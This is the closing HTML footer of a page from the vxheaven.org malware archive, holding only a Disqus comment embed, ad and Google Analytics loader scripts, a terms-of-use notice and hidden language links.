<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vhu00">de</a><a href="/lib/index.php?lang=en&amp;id=vhu00">en</a><a href="/lib/index.php?lang=es&amp;id=vhu00">es</a><a href="/lib/index.php?lang=it&amp;id=vhu00">it</a><a href="/lib/index.php?lang=fr&amp;id=vhu00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vhu00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vhu00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vhu00">ua</a></div>
</body>
</html>
